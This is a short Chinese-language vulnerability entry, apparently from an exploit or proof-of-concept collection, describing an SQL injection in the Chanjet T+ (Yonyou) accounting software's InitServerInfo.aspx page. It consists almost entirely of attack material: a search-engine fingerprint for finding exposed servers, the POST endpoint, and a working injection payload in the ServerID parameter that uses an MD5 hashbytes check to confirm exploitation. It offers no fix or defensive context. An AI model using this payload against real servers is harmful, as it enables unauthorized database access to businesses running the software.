# 畅捷通T+InitServerInfo.aspx存在SQL漏洞

用友 ｜ 其他 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/UFAQD/InitServerInfo.aspx?preload=1 HTTP/1.1`

**Payload**
```
operbtn=create&ServerID=1'%2b(select 1 where 1 in (SELECT sys.fn_varbintohexstr(hashbytes('MD5','123456'))))%2b'1
```